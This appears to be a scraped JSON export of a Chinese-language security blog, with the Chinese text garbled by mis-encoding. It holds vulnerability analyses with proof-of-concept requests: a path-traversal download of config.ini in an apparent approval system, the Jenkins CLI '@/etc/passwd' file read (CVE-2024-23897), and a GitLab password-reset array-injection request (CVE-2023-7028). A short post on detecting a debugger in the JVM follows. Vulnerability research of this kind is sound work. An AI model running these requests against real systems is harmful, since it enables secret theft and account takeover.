if($action == &quot;review&quot;) &#123; $b_error = FALSE; if(filesize($file_dir) &lt;= 0) &#123; chmod($file_dir,0777); //ä¿®æ”¹æƒé™ unlink($file_dir); $msg = $langConfig[&#x27;error_emptyFile&#x27;]; $data[&#x27;msg&#x27;] = $msg; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;isM&#x27;] = $this-&gt;isM?&#x27;mobile&#x27;:&#x27;pc&#x27;; $data[&#x27;backParam&#x27;] = $backparam; $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;view(&#x27;appr/ErrorView2&#x27;,$data); return; &#125; // è·å–æ°´å° $cfgPath = FCPATH . &quot;config.ini&quot;; $this-&gt;load-&gt;model(&quot;Ini_model&quot;); //åŠ è½½è°ƒç”¨æ¥å£çš„æ–¹æ³• $watermaskOpen = $this-&gt;Ini_model-&gt;get_ini_string(&#x27;watermaskcfg&#x27;,&#x27;open&#x27;,&#x27;&#x27;,$cfgPath); if($watermaskOpen == &#x27;1&#x27;)&#123; $content = $this-&gt;Ini_model-&gt;get_ini_string(&#x27;watermaskcfg&#x27;,&#x27;content&#x27;,&#x27;&#x27;,$cfgPath); $cType = mb_detect_encoding($content , array(&#x27;UTF-8&#x27;,&#x27;GBK&#x27;,&#x27;LATIN1&#x27;,&#x27;BIG5&#x27;)) ; if( $cType !== &#x27;UTF-8&#x27;)&#123; $content = mb_convert_encoding($content ,&#x27;utf-8&#x27; , $cType); &#125; if($content === &#x27;&#x27;)&#123; $content = $_SERVER[&#x27;REMOTE_ADDR&#x27;].&quot; &quot;.$this-&gt;session-&gt;userdata(&#x27;SuName&#x27;).&quot; &quot;.date(&quot;Y-m-d H:i:s&quot;); &#125;else&#123; $content = str_replace(&quot;[ip]&quot;,&quot; &quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;].&quot; &quot;,$content); $content = str_replace(&quot;[user]&quot;,&quot; &quot;.$this-&gt;session-&gt;userdata(&#x27;SuName&#x27;).&quot; &quot;,$content); $content = str_replace(&quot;[time]&quot;,&quot; &quot;.date(&quot;Y-m-d H:i:s&quot;).&quot; &quot;,$content); $content= str_replace(array(&#x27;\\r\\n&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;),PHP_EOL,$content); // å¾—åˆ°çš„æ˜¯å•å¼•å·å­—ç¬¦ä¸²ï¼Œéœ€å¤„ç†æ¢è¡Œç¬¦å· &#125; $fontsize = $this-&gt;Ini_model-&gt;get_ini_string(&#x27;watermaskcfg&#x27;,&#x27;fontsize&#x27;,&#x27;&#x27;,$cfgPath); $alpha = $this-&gt;Ini_model-&gt;get_ini_string(&#x27;watermaskcfg&#x27;,&#x27;alpha&#x27;,&#x27;&#x27;,$cfgPath); if($alpha)&#123; $alpha = min($alpha, 100); $alpha = max($alpha, 0); &#125;else&#123; $alpha = 70; &#125; $config = array( &quot;text&quot; =&gt; $content, &quot;type&quot; =&gt; 0, &quot;fontsize&quot; =&gt; $fontsize ? $fontsize.&#x27;px&#x27; : &quot;16px&quot;, &quot;alpha&quot; =&gt; 1 - $alpha / 100 ); $data[&#x27;script&#x27;] = $this-&gt;getscript(json_encode($config)); &#125; //å–æ–‡ä»¶çš„åç§°ä»¥åŠç±»å‹ $fileBaseName = preg_replace(&#x27;/^.+[\\\\\\\\\\\\/]/&#x27;, &#x27;&#x27;, $file_dir); // å–æ–‡ä»¶ç±» $path_parts = pathinfo($fileBaseName); $fileBaseType = isset($path_parts[&quot;extension&quot;]) ? $path_parts[&quot;extension&quot;] : &#x27;&#x27;; $fileBaseType = strtolower($fileBaseType); $isTxt = FALSE; if($fileBaseType == &#x27;txt&#x27; || $fileBaseType == &#x27;csv&#x27;) &#123; $isTxt = TRUE; $result = $this-&gt;decryptFile(dirname(BASEPATH).&quot;/&quot;.$file_dir, $backparam); if(!$result) &#123; return; &#125; $handle = fopen($file_dir, &quot;r&quot;); $newFilename = $this-&gt;logID . microtime(true) . &quot;.txt&quot;; $newSavepath = &quot;tempFile/&quot;.$newFilename; $newHandle = fopen($newSavepath,&quot;w+&quot;,TRUE); $content = &#x27;&#x27;; // ob_clean(); // ini_set(&#x27;memory_limit&#x27;,-1); // set_time_limit(0); $buffer = 1024 * 48; // $size = filesize($file_dir); $code = FALSE; $left = &#x27;&#x27;; while (!feof($handle))&#123; $content = $left.fread($handle, $buffer); if ($code != &#x27;UTF-16LE&#x27;) &#123; //IPG-17136 webå®¡æ‰¹-é¢„è§ˆå¸¦ä¸­æ–‡å†…å®¹çš„txtæ–‡æ¡£ä¹±ç  $code = get_string_code($content);//$code = mb_detect_encoding($content, &quot;ASCII,GB2312,GBK,BIG-5,UTF-8,UTF-16LE&quot;); if (strlen($code) === 0) $code = &quot;UTF-16LE&quot;; &#125; if ($code != &#x27;UTF-16LE&#x27; &amp;&amp; !feof($handle)) &#123; $idx = strrpos($content, &quot;\\n&quot;); if ($idx === FALSE) $idx = strrpos($content, &#x27; &#x27;); if ($idx === FALSE) &#123; $left = &#x27;&#x27;; &#125; else &#123; $idx += 1; $left = substr($content, $idx); $content = substr($content, 0, $idx); &#125; &#125; $t = mb_convert_encoding($content, &quot;UTF-8&quot;, $code); fwrite($newHandle,$t); unset($t); // flush(); &#125; fclose($handle); fclose($newHandle); chmod($file_dir,0777); //ä¿®æ”¹æƒé™ unlink($file_dir); // $filename = $newFilename; $file_dir = $newSavepath; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;backParam&#x27;] = $backparam; $data[&#x27;url&#x27;] = base_url($file_dir); $data[&#x27;app&#x27;] = $this-&gt;isApp; $this-&gt;load-&gt;view(&#x27;appr/reviewtxt2&#x27;, $data); //IPG-16347 webæ§åˆ¶å°ï¼Œæ¡Œé¢ç”³è¯·å®¡æ‰¹ï¼Œé™åˆ¶æ–‡ä»¶ç±»å‹ï¼Œwebæ§åˆ¶å°é¢„è§ˆåï¼Œæ§åˆ¶å°ä»æ˜¾ç¤ºä¸ºæœªé¢„è§ˆ //è§£å¯†ç”³è¯· if($this-&gt;pfunc == &#x27;encrypt&#x27;)&#123; $this-&gt;setFileReadStatus($detail, $srcPath, $type, $guidID); &#125; //æ¡Œé¢ç”³è¯· else if($this-&gt;pfunc == &#x27;normal&#x27;)&#123; $this-&gt;nf_setFileReadStatus($srcPath, $guidID); &#125; return; &#125; require_once(dirname(BASEPATH).&quot;/static/appr/lib/flexpaper/php/tool_transform.php&quot;); $image = FALSE; $html = FALSE; $dest_file = dirname(BASEPATH).&quot;/&quot;.$file_dir; $doc_type = null; $html_path = &quot;&quot;; //å½“ä½¿ç”¨æ¨¡å¼5é¢„è§ˆçš„æ—¶å€™ï¼Œåº”è¯¥è¦æœ‰å€¼ $ext = pathinfo($dest_file)[&#x27;extension&#x27;]; $ext = strtolower($ext); if ($ext != &quot;pdf&quot;) &#123; if (!$isTxt) &#123; $result = $this-&gt;decryptFile(dirname(BASEPATH).&quot;/&quot;.$file_dir, $backparam); if (!$result) &#123; return; &#125; &#125; if ($ext == &quot;html&quot; || $ext == &quot;htm&quot;) &#123; $html = TRUE; &#125; else if (!@getimagesize($dest_file)) &#123; $dest_file = dirname(BASEPATH).&quot;/&quot;.$file_dir.&quot;.pdf&quot;; // $transResult = trans_office2pdf(dirname(BASEPATH).&quot;/&quot;.$file_dir, $dest_file); //è¿”å›å€¼ä¿®æ”¹ä¸ºæ•°ç»„ $transResult = trans_office2pdf_2(dirname(BASEPATH).&quot;/&quot;.$file_dir, $dest_file); $dest_file = $transResult[&#x27;dest_file&#x27;]; $doc_type = $transResult[&#x27;doc_type&#x27;]; $html_path = $transResult[&#x27;html_path&#x27;]; if ($transResult[&#x27;info&#x27;] == &#x27;&#x27;) &#123; //æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œå¤šæ•°ä¸ºæ²¡æœ‰å¯åŠ¨openoffice chmod($file_dir, 0777); //ä¿®æ”¹æƒé™ unlink($file_dir); $msg = $langConfig[&#x27;error_reviewFile&#x27;]; $data[&#x27;msg&#x27;] = $msg; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;isM&#x27;] = $this-&gt;isM ? &#x27;mobile&#x27; : &#x27;pc&#x27;; $data[&#x27;backParam&#x27;] = $backparam; $this-&gt;load-&gt;helper(&#x27;url&#x27;); $this-&gt;load-&gt;view(&#x27;appr/ErrorView2&#x27;, $data); return; &#125; &#125; else &#123; $image = TRUE; &#125; &#125; if (!$image &amp;&amp; !$html) &#123; $result = $this-&gt;decryptFile($dest_file, $backparam); if (!$result) &#123; return; &#125; $page = getTotalPages($dest_file); $this-&gt;load-&gt;helper(&#x27;url&#x27;); $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;pdf_file&#x27;] = pathinfo($dest_file)[&#x27;basename&#x27;]; $data[&#x27;page_num&#x27;] = $page; $data[&#x27;backParam&#x27;] = $backparam; $data[&#x27;app&#x27;] = $this-&gt;isApp; $data[&#x27;html_file&#x27;] = $html_path; //C:Program Files (x86)/TEC/WebServer/www/ipg/tempFile/030BF...924.1872/review.html $data[&#x27;doc_type&#x27;] = $doc_type; $this-&gt;load-&gt;view(&#x27;appr/review2&#x27;, $data); &#125; else &#123; $data[&#x27;langConfig&#x27;] = $langConfig; $data[&#x27;url&#x27;] = &quot;tempFile/&quot;.pathinfo($dest_file)[&#x27;basename&#x27;]; $data[&#x27;backParam&#x27;] = $backparam; $data[&#x27;app&#x27;] = $this-&gt;isApp; if ($image) &#123; $this-&gt;load-&gt;view(&#x27;appr/reviewpic2&#x27;, $data); &#125; else &#123; $this-&gt;load-&gt;view(&#x27;appr/reviewhtml2&#x27;, $data); &#125; &#125; &#125; //IPG-16347 webæ§åˆ¶å°ï¼Œæ¡Œé¢ç”³è¯·å®¡æ‰¹ï¼Œé™åˆ¶æ–‡ä»¶ç±»å‹ï¼Œwebæ§åˆ¶å°é¢„è§ˆåï¼Œæ§åˆ¶å°ä»æ˜¾ç¤ºä¸ºæœªé¢„è§ˆ //è§£å¯†ç”³è¯· if($this-&gt;pfunc == &#x27;encrypt&#x27;)&#123; $this-&gt;setFileReadStatus($detail, $srcPath, $type, $guidID); &#125; //æ¡Œé¢ç”³è¯· else if($this-&gt;pfunc == &#x27;normal&#x27;)&#123; $this-&gt;nf_setFileReadStatus($srcPath, $guidID); &#125;&#125; å› æ­¤æœ€ç»ˆæ„é€ å¦‚ä¸‹ï¼Œå³å¯å®ç°å¯¹ä»»æ„æ–‡ä»¶çš„è¯»å–ï¼Œå¦å¤–åˆ é™¤æ–‡ä»¶ç±»ä¼¼ä¸å†ç»§ç»­èµ˜è¿°ï¼Œè¿™ä¸ªæ¼æ´æœ¬èº«ä¹Ÿå¹¶ä¸éš¾æ²¡æœ‰å•¥é«˜å«é‡‘é‡ 12345678910POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1Host:Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Length: 0Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36path=..%2Fconfig.ini&amp;filename=y4test&amp;action=download","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"}]},{"title":"æµ…æJenkisä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-23897)","slug":"year/2024/1/æµ…æJenkisä»»æ„æ–‡ä»¶è¯»å–-CVE-2024-23897","date":"2024-01-27T02:07:37.000Z","updated":"2024-01-27T05:25:10.000Z","comments":true,"path":"2024/01/27/year/2024/1/æµ…æJenkisä»»æ„æ–‡ä»¶è¯»å–-CVE-2024-23897/","link":"","permalink":"https://y4tacker.github.io/2024/01/27/year/2024/1/%E6%B5%85%E6%9E%90Jenkis%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2024-23897/","excerpt":"","text":"æµ…æJenkisä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-23897)å¾ˆä¹…æ²¡æ›´æ–°åšå®¢äº†ï¼Œè¿˜æ˜¯æµ…æµ…æ›´æ–°ä¸€ä¸‹ è¡¥ä¸åˆ†æé¦–å…ˆä»å®˜æ–¹å…¬å‘Šå¯ä»¥çœ‹åˆ°æ¼æ´å…¶å®æ¥æºäºCLIå·¥å…·ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°ç”¨æˆ·æ‹¥æœ‰(Overall/Read)æƒé™å¯ä»¥è¯»å–æ•´ä¸ªæ–‡ä»¶ï¼Œè€Œå¦‚æœæ²¡æœ‰æƒé™åˆ™ä»…èƒ½è¯»å–ç¬¬ä¸€è¡Œ åŒæ—¶ä»commitå¯ä»¥çœ‹å‡º[SECURITY-3314] Â· jenkinsci/jenkins@554f037 ï¼Œä¸»è¦å¯¹CLICommand.javaåšäº†ä¿®æ”¹ï¼Œç¦æ­¢ä½¿ç”¨@ç¬¦å·ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿çœ‹çœ‹è§£æçš„æ—¶å€™æ˜¯å¦‚ä½•å¤„ç†@ç¬¦å· åœ¨org.kohsuke.args4j.CmdLineParser#parseArgumentä¸­ï¼Œè°ƒç”¨äº†expandAtFilesæ–¹æ³•ï¼Œä»åå­—å°±èƒ½çœ‹å‡ºæ˜¯å¤„ç†@ç¬¦å· 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public void parseArgument(String... args) throws CmdLineException &#123; Utilities.checkNonNull(args, &quot;args&quot;); String[] expandedArgs = args; if (this.parserProperties.getAtSyntax()) &#123; expandedArgs = this.expandAtFiles(args); &#125; CmdLineImpl cmdLine = new CmdLineImpl(expandedArgs); Set&lt;OptionHandler&gt; present = new HashSet(); int argIndex = 0; while(cmdLine.hasMore()) &#123; String arg = cmdLine.getCurrentToken(); if (!this.isOption(arg)) &#123; if (argIndex &gt;= this.arguments.size()) &#123; Messages msg = this.arguments.size() == 0 ? Messages.NO_ARGUMENT_ALLOWED : Messages.TOO_MANY_ARGUMENTS; throw new CmdLineException(this, msg, new String[]&#123;arg&#125;); &#125; this.currentOptionHandler = (OptionHandler)this.arguments.get(argIndex); if (this.currentOptionHandler == null) &#123; throw new IllegalStateException(&quot;@Argument with index=&quot; + argIndex + &quot; is undefined&quot;); &#125; if (!this.currentOptionHandler.option.isMultiValued()) &#123; ++argIndex; &#125; &#125; else &#123; boolean isKeyValuePair = arg.contains(this.parserProperties.getOptionValueDelimiter()) || arg.indexOf(61) != -1; this.currentOptionHandler = isKeyValuePair ? this.findOptionHandler(arg) : this.findOptionByName(arg); if (this.currentOptionHandler == null) &#123; throw new CmdLineException(this, Messages.UNDEFINED_OPTION, new String[]&#123;arg&#125;); &#125; if (isKeyValuePair) &#123; cmdLine.splitToken(); &#125; else &#123; cmdLine.proceed(1); &#125; &#125; int diff = this.currentOptionHandler.parseArguments(cmdLine); cmdLine.proceed(diff); present.add(this.currentOptionHandler); &#125; boolean helpSet = false; Iterator i$ = this.options.iterator(); while(i$.hasNext()) &#123; OptionHandler handler = (OptionHandler)i$.next(); if (handler.option.help() &amp;&amp; present.contains(handler)) &#123; helpSet = true; &#125; &#125; if (!helpSet) &#123; this.checkRequiredOptionsAndArguments(present); &#125; &#125; åœ¨expandAtFilesä¸­å¦‚æœå‚æ•°ä»¥@å¼€å¤´å°±ä¼šè¯»å–@åå¯¹åº”çš„æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹æ·»åŠ åˆ°æ•°ç»„resultè¿”å› 12345678910111213141516171819202122232425private String[] expandAtFiles(String[] args) throws CmdLineException &#123; List&lt;String&gt; result = new ArrayList(); String[] arr$ = args; int len$ = args.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; String arg = arr$[i$]; if (arg.startsWith(&quot;@&quot;)) &#123; File file = new File(arg.substring(1)); if (!file.exists()) &#123; throw new CmdLineException(this, Messages.NO_SUCH_FILE, new String[]&#123;file.getPath()&#125;); &#125; try &#123; result.addAll(readAllLines(file)); &#125; catch (IOException var9) &#123; throw new CmdLineException(this, &quot;Failed to parse &quot; + file, var9); &#125; &#125; else &#123; result.add(arg); &#125; &#125; return (String[])result.toArray(new String[result.size()]);&#125; ç»§ç»­å›åˆ°CLICommand,å¯ä»¥çœ‹åˆ°åœ¨è§£æå‰æœ‰é‰´æƒå¤„ç†ï¼Œä½†å¦‚æœå‘½ä»¤æ˜¯HelpCommand\\WhoAmICommandçš„å®ä¾‹é‚£ä¹ˆå°±ä¸éœ€è¦æƒé™ 123456789sc = SecurityContextHolder.getContext();old = sc.getAuthentication();Authentication auth;sc.setAuthentication(auth = this.getTransportAuthentication2());if (!(this instanceof HelpCommand) &amp;&amp; !(this instanceof WhoAmICommand)) &#123; Jenkins.get().checkPermission(Jenkins.READ);&#125;p.parseArgument((String[])args.toArray(new String[0])); å› æ­¤æ‰§è¡Œ java -jar jenkins-cli.jar -s http://127.0.0.1:8080/ help @/etc/passwdæˆ– java -jar jenkins-cli.jar -s http://127.0.0.1:8080/ who-am-i @/etc/passwd å½“ç„¶å…¶å®å…¶ä»–æŒ‡ä»¤ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæœ‰äº†æ–‡ä»¶è¯»å–æˆ‘ä»¬å…¶å®èƒ½åšçš„å°±å¾ˆå¤šäº†ï¼Œæœ€å¸¸è§çš„è¯»å–/var/jenkins_home/secrets/ master.key,å½“ç„¶å¯èƒ½åœ¨å…¶ä»–ç›®å½•ä¸‹ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥è¯»å–/proc/self/cmdlineè¯»å–å¯åŠ¨ å½“ç„¶ååˆ©ç”¨ä¸æ˜¯è¿™ç¯‡æ–‡ç« çš„ä¸»é¢˜ï¼Œæœ‰ç©ºç½‘ä¸Šå¤šç™¾åº¦çœ‹çœ‹æ–‡ç« å³å¯ å‚è€ƒé“¾æ¥https://www.openwall.com/lists/oss-security/2024/01/24/6 https://www.openwall.com/lists/oss-security/2024/01/24/6","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Jenkis","slug":"Jenkis","permalink":"https://y4tacker.github.io/tags/Jenkis/"}]},{"title":"æµ…æGitlabæœªæˆæƒå¯†ç é‡ç½®(CVE-2023-7028)","slug":"year/2024/1/æµ…æGitlabæœªæˆæƒå¯†ç é‡ç½®-CVE-2023-7028","date":"2024-01-12T11:25:03.000Z","updated":"2024-01-27T06:11:14.000Z","comments":true,"path":"2024/01/12/year/2024/1/æµ…æGitlabæœªæˆæƒå¯†ç é‡ç½®-CVE-2023-7028/","link":"","permalink":"https://y4tacker.github.io/2024/01/12/year/2024/1/%E6%B5%85%E6%9E%90Gitlab%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-CVE-2023-7028/","excerpt":"","text":"æµ…æGitlabæœªæˆæƒå¯†ç é‡ç½®(CVE-2023-7028)è¡¥ä¸åœ¨https://gitlab.com/rluna-gitlab/gitlab-ce/-/commit/24d1060c0ae7d0ba432271da98f4fa20ab6fd671ï¼Œç”±äºé—®é¢˜éå¸¸ç®€å•ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº† å¯ä»¥çœ‹åˆ°åœ¨åŸæ¥çš„é€»è¾‘å½“ä¸­app/models/concerns/recoverable_by_any_email.rb 123456789101112131415161718192021222324252627282930313233343536module RecoverableByAnyEmail extend ActiveSupport::Concern class_methods do def send_reset_password_instructions(attributes = &#123;&#125;) email = attributes.delete(:email) super unless email recoverable = by_email_with_errors(email) recoverable.send_reset_password_instructions(to: email) if recoverable&amp;.persisted? recoverable end private def by_email_with_errors(email) record = find_by_any_email(email, confirmed: true) || new record.errors.add(:email, :invalid) unless record.persisted? record end end def send_reset_password_instructions(opts = &#123;&#125;) token = set_reset_password_token send_reset_password_instructions_notification(token, opts) token end private def send_reset_password_instructions_notification(token, opts = &#123;&#125;) send_devise_notification(:reset_password_instructions, token, opts) endend é¦–å…ˆè·å–å‚æ•°email,é€šè¿‡by_email_with_errorsæ–¹æ³•æŸ¥æ‰¾ç”¨æˆ·ï¼Œå¦‚æœæœªæ‰¾åˆ°ç”¨æˆ·ä¹Ÿä¼šå‘è®°å½•ä¸­æ·»åŠ é”™è¯¯ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å…·ä½“çœ‹çœ‹find_by_any_emailæ–¹æ³•ï¼Œå¦‚æœemailå‚æ•°å­˜åœ¨åˆ™ç»§ç»­å‘ä¸‹æ‰§è¡Œby_any_emailæ–¹æ³• 12345def find_by_any_email(email, confirmed: false) return unless email by_any_email(email, confirmed: confirmed).takeend åœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿä¸å¿…è¦æ¢³ç†å…·ä½“çš„é€»è¾‘ï¼Œä»by_user_emailçš„å‚æ•°æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå®ƒé€šè¿‡iwhereå»æŸ¥æ‰¾å¯¹åº”çš„è®°å½•ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°ä»å‚æ•°ç±»å‹å¯ä»¥çœ‹åˆ°å®ƒæ˜¯æ”¯æŒæ•°ç»„çš„ï¼å¦‚æœè®°å½•å­˜åœ¨å°±ä¼šè§¦å‘å¯†ç é‡ç½®é‚®ä»¶çš„å‘é€ã€‚ 12345678910111213141516171819202122232425262728def by_any_email(emails, confirmed: false) from_users = by_user_email(emails) from_users = from_users.confirmed if confirmed from_emails = by_emails(emails).merge(Email.confirmed) from_emails = from_emails.confirmed if confirmed items = [from_users, from_emails] user_ids = Gitlab::PrivateCommitEmail.user_ids_for_emails(Array(emails).map(&amp;:downcase)) items &lt;&lt; where(id: user_ids) if user_ids.present? from_union(items)endxxxçœç•¥xxxscope :by_user_email, -&gt; (emails) &#123; iwhere(email: Array(emails)) &#125;scope :by_emails, -&gt; (emails) &#123; joins(:emails).where(emails: &#123; email: Array(emails).map(&amp;:downcase) &#125;) &#125;scope :for_todos, -&gt; (todos) &#123; where(id: todos.select(:user_id).distinct) &#125;scope :with_emails, -&gt; &#123; preload(:emails) &#125;scope :with_dashboard, -&gt; (dashboard) &#123; where(dashboard: dashboard) &#125;scope :with_public_profile, -&gt; &#123; where(private_profile: false) &#125;scope :with_expiring_and_not_notified_personal_access_tokens, -&gt;(at) do where(&#x27;EXISTS (?)&#x27;, ::PersonalAccessToken .where(&#x27;personal_access_tokens.user_id = users.id&#x27;) .without_impersonation .expiring_and_not_notified(at).select(1) ) å› æ­¤æˆ‘ä»¬ä¸éš¾æ„é€ å…¶poc 12345POST /users/password HTTP/1.1Host: 118.195.225.92:8090User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36authenticity_token=GNymVmxzUZVZrVqQS5cCtrlDwdbdGpmh4v4ojIqKc1r_yUalsQ7K5QclCQihuK88E2lJvcMGcPr5E4uJH1qtGw&amp;user[email][]=123@163.com&amp;user[email][]=47.109.68.247:1234/?a=@qq.com ç®€å•çœ‹ä¸€ä¸‹ä¿®å¤åçš„ä»£ç ï¼Œè™½ç„¶ä»£ç å˜åŠ¨è¿˜æ˜¯è›®å¤§çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸éš¾å‘ç°æœ‰ä¸€ç‚¹ï¼Œåœ¨æŸ¥è¯¢æ—¶è°ƒç”¨äº†attributes[:email].to_sï¼Œè¿™ä¸ªto_så…¶å®å°±ä¼šå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿé¿å…äº†æ•°ç»„çš„é—®é¢˜ï¼Œåé¢è¿˜æœ‰äº›å…¶ä»–çš„æ”¹åŠ¨å½“ç„¶ä¸æ˜¯å¾ˆé‡è¦ï¼Œæœ‰å…´è¶£è‡ªå·±çœ‹çœ‹ 12345678910111213141516171819202122232425262728293031module RecoverableByAnyEmail extend ActiveSupport::Concern class_methods do def send_reset_password_instructions(attributes = &#123;&#125;) return super unless attributes[:email] email = Email.confirmed.find_by(email: attributes[:email].to_s) return super unless email recoverable = email.user recoverable.send_reset_password_instructions(to: email.email) recoverable end end def send_reset_password_instructions(opts = &#123;&#125;) token = set_reset_password_token send_reset_password_instructions_notification(token, opts) token end protected def send_reset_password_instructions_notification(token, opts = &#123;&#125;) send_devise_notification(:reset_password_instructions, token, opts) endend","categories":[{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/tags/Python/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://y4tacker.github.io/tags/Gitlab/"}]},{"title":"å¦‚ä½•åˆ¤æ–­åœ¨IDEAä¸­ç¨‹åºæ­£åœ¨è¿è¡Œæˆ–æ­£åœ¨Debug","slug":"year/2024/1/å¦‚ä½•åˆ¤æ–­åœ¨IDEAä¸­ç¨‹åºæ­£åœ¨è¿è¡Œæˆ–æ­£åœ¨Debug","date":"2024-01-04T15:20:39.000Z","updated":"2024-01-04T15:40:58.000Z","comments":true,"path":"2024/01/04/year/2024/1/å¦‚ä½•åˆ¤æ–­åœ¨IDEAä¸­ç¨‹åºæ­£åœ¨è¿è¡Œæˆ–æ­£åœ¨Debug/","link":"","permalink":"https://y4tacker.github.io/2024/01/04/year/2024/1/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%9C%A8IDEA%E4%B8%AD%E7%A8%8B%E5%BA%8F%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E6%88%96%E6%AD%A3%E5%9C%A8Debug/","excerpt":"","text":"å¦‚ä½•åˆ¤æ–­åœ¨IDEAä¸­ç¨‹åºæ­£åœ¨è¿è¡Œæˆ–æ­£åœ¨Debugç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªæœ‰è¶£åˆæ— ç”¨çš„ä¸œè¥¿ï¼Œå¦‚ä½•åˆ¤æ–­åœ¨IDEAä¸­ç¨‹åºæ­£åœ¨è¿è¡Œæˆ–æ­£åœ¨Debug åœ¨è¿™ä¸ªä¹‹å‰æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸ªç±»ManagementFactory ï¼Œå®ƒæ˜¯ Java æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ƒæä¾›äº†è®¿é—®è¿è¡Œæ—¶ç³»ç»Ÿç®¡ç†æ¥å£çš„å·¥å‚æ–¹æ³•ã€‚é€šè¿‡ ManagementFactory ç±»ï¼Œå¯ä»¥è·å–åŒ…æ‹¬æ“ä½œç³»ç»Ÿã€å†…å­˜ã€çº¿ç¨‹ã€ç±»åŠ è½½å™¨ç­‰åœ¨å†…çš„å¤šç§ç³»ç»Ÿç®¡ç†ä¿¡æ¯ã€‚ ä¸€äº›å¸¸ç”¨çš„ç”¨é€”åŒ…æ‹¬ï¼š è·å–è¿è¡Œæ—¶ä¿¡æ¯ï¼šå¯ä»¥é€šè¿‡ ManagementFactory.getRuntimeMXBean() æ–¹æ³•è·å–ä¸ Java è™šæ‹Ÿæœºçš„è¿è¡Œæ—¶ä¿¡æ¯ç›¸å…³çš„ beanï¼ŒåŒ…æ‹¬è™šæ‹Ÿæœºçš„åç§°ã€è™šæ‹Ÿæœºçš„å¯åŠ¨æ—¶é—´ã€è™šæ‹Ÿæœºçš„ç³»ç»Ÿå±æ€§ç­‰ã€‚ è·å–æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼šå¯ä»¥ä½¿ç”¨ ManagementFactory.getOperatingSystemMXBean() æ–¹æ³•è·å–ä¸æ“ä½œç³»ç»Ÿç›¸å…³çš„ beanï¼ŒåŒ…æ‹¬ CPU æ•°é‡ã€ç³»ç»Ÿè´Ÿè½½ç­‰ä¿¡æ¯ã€‚ è·å–å†…å­˜ä¿¡æ¯ï¼šå¯ä»¥ä½¿ç”¨ ManagementFactory.getMemoryMXBean() æ–¹æ³•è·å–ä¸å†…å­˜ç›¸å…³çš„ beanï¼ŒåŒ…æ‹¬å †å†…å­˜ä½¿ç”¨æƒ…å†µã€éå †å†…å­˜ä½¿ç”¨æƒ…å†µç­‰ã€‚ è·å–çº¿ç¨‹ä¿¡æ¯ï¼šå¯ä»¥ä½¿ç”¨ ManagementFactory.getThreadMXBean() æ–¹æ³•è·å–ä¸çº¿ç¨‹ç›¸å…³çš„ beanï¼ŒåŒ…æ‹¬çº¿ç¨‹æ•°é‡ã€çº¿ç¨‹çŠ¶æ€ç­‰ã€‚ å› æ­¤æˆ‘ä»¬é€šè¿‡ ManagementFactory.getRuntimeMXBean().getInputArguments() å³å¯è·å¾—æ‰€æœ‰ JVM å‚æ•° é€šè¿‡ä¸‹é¢è¿™æ ·ç®€å•çš„ä»£ç æˆ‘ä»¬å¯ä»¥ 1234List&lt;String&gt; inputArguments = ManagementFactory.getRuntimeMXBean().getInputArguments(); for (String arg : inputArguments) &#123; System.out.println(arg);&#125; ä»¥æˆ‘çš„ç”µè„‘ä¸ºä¾‹ï¼Œæ™®é€šè¿è¡Œæ—¶ 12-javaagent:/Applications/myapp/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=51347:/Applications/myapp/IntelliJ IDEA.app/Contents/bin-Dfile.encoding=UTF-8 debugæ—¶ 